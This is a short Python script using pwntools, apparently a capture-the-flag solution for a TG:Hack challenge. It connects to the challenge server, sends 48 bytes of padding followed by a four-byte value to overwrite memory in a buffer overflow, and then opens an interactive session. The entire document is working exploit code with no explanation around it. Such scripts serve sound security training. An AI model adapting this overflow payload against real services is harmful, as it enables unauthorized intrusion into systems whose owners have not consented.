from pwn import *
padding = 'A' * 48
value = "\x01\x00\x00\x00"
exploit = padding + value
r = remote("pwntion2.tghack.no",1062)
r.recvuntil("Student:")
r.recvline()
r.send(exploit)
r.interactive()